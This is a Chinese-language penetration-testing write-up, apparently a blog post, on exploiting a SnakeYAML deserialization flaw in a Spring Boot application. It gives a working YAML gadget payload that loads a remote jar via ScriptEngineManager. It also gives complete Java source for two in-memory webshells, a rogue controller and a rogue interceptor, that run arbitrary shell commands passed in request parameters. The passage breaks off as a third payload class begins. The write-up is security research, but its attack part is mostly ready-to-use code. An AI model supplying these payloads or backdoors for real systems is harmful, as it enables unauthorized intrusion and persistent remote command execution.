## springboot snakeyaml利用浅析
> 本文简要分析了snakeyaml漏洞在一般场景下注入内存马的难点，并对存在内嵌tomcat依赖的spring应用提出一种漏洞利用思路
### 1\. 前言
前几天接到个任务，目标系统采用springboot框架，测试发现存在 /env 等配置信息泄露，且存在 snake-yaml 漏洞，通过 dump
内存及修改 spring.cloud.bootstrap.location
字段可以确定目标不出网且以jar包形式运行，且该系统为内网端口映射方式运行，不可直接与目标主机通信。幸好目标系统可以上传任意文件，且spring服务端口号与映射端口号一致，这样我们可以先上传jar包到可访问目录下：
拼接后的路径为：
127.0.0.1，写入yaml文件：
    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://127.0.0.1:9090/server/static/img/2022/04/10/90920220410084330581.jar"]
      ]]
    ]
替换 spring.cloud.bootstrap.location 字段后刷新配置：
返回报错，但查看异常发现已经创建了 ScriptEngineManager 实例，即可以任意执行代码，通过将执行结果输出到可访问文件中，可获取回显：
然而仅仅是能执行命令肯定是不够的，首先想到的就是写入内存马，既然能够任意代码执行，那么写内存马肯定不难，我天真的这么以为，然而折磨才刚刚开始。。。
### 2.前置知识 - Spring 常见内存马
此处仅针对非Java
agent类型内存马，一般的注入思路都是找到一个保存当前应用上下文的全局变量，进而取出我们需要注入的组件进行修改。对于Spring，可注入的组件有
控制器Controller 和
拦截器Interceptor，前者通过注册一个路由绑定我们需要执行的恶意方法，后者在拦截器数组中插入我们的恶意拦截器，以达到在请求真实数据前执行我们的恶意方法。对于实际情况，由于系统可能会对某些路由进行安全性准入，故拦截器利用的效果更好。以下是一些常见的注入测试代码。
#### 2.1 控制器
    package code.landgrey.controller;
    import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RestController;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
    import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
    import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStreamReader;
    import java.lang.reflect.Method;
    import java.util.Arrays;
    @RestController
    @EnableAutoConfiguration
    public class ControllerInject {
        @RequestMapping("/inject2")
        public String inject() {
            try {
                WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    //            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
                RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
                // 注册执行命令的shell
                Method method = (Evil.class.getMethods())[0];
                PatternsRequestCondition url = new PatternsRequestCondition("/exec");
                RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
                RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
                r.registerMapping(info, new Evil(), method);
                return "success";
            } catch (Exception e){
                return (Arrays.toString(e.getStackTrace()));
            }
        }
        public class Evil {
            public Evil() {
            }
            @RequestMapping(value = "/exec")
            public void exec(HttpServletRequest request, HttpServletResponse response) throws IOException {
                try {
                    String cmd = request.getParameter("code");
                    if (cmd != null) {
                        Process process;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
                        } else {
                            process = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd});
                        }
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        StringBuilder stringBuilder = new StringBuilder();
                        String line;
                        while((line = bufferedReader.readLine()) != null) {
                            stringBuilder.append(line + '\n');
                        }
                        response.getOutputStream().write(stringBuilder.toString().getBytes());
                        response.getOutputStream().flush();
                        response.getOutputStream().close();
                    } else {
                        response.sendError(404);
                    }
                } catch (Exception var8) {
                }
            }
        }
    }
#### 2.2 拦截器
    package code.landgrey.controller;
    import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RestController;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;
    import java.lang.reflect.Field;
    @RestController
    @EnableAutoConfiguration
    public class InterceptorInject {
        @RequestMapping("/inject")
        public String inject() throws Exception {
            // 获取应用上下文
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 通过绑定Bean 取出 RequestMappingHandlerMapping
            RequestMappingHandlerMapping abstractHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);
            //实例化恶意拦截器并注册
            for (Object i : adaptedInterceptors) {
                if (i.getClass().getName().contains("Madao")) {
                    return "ok";
                }
            }
            adaptedInterceptors.add(new Madao());
            return "success";
        }
        public class Madao  extends HandlerInterceptorAdapter {
            public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
                if (request.getParameter("passer") != null) {
                String cmd = request.getParameter("passer");
                Process process;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    process = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd});
                }
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                response.getOutputStream().write(stringBuilder.toString().getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
                return false;
            }
            return true;
            }
        }
    }
以上代码本地测试均可通过，对于yaml漏洞无非就是把`ScriptEngineFactory`子类中的初始化代码改成控制器中的代码，核心代码如下：
`AwesomeScriptEngineFactory.class`：
    package artsploit;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.context.request.ServletRequestAttributes;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    import javax.script.ScriptEngine;
    import javax.script.ScriptEngineFactory;
    import java.lang.reflect.Field;